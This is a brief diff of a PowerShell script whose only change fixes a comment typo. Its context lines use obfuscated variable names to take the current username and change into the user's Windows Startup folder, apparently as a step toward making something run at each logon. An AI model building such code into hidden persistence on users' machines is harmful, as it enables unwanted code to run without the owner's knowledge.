@@ -12,7 +12,7 @@ $QEXcMiaOoG=$mWjZRdpvnM.split("\")
 $lYIbKdtBmp=$QEXcMiaOoG[1]
 # write-host "$username"
 
-# move into startup directorye
+# move into startup directore
 $GtgdfjFhLV="C:\Users\$lYIbKdtBmp\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 Set-Location -Path $GtgdfjFhLV 
 
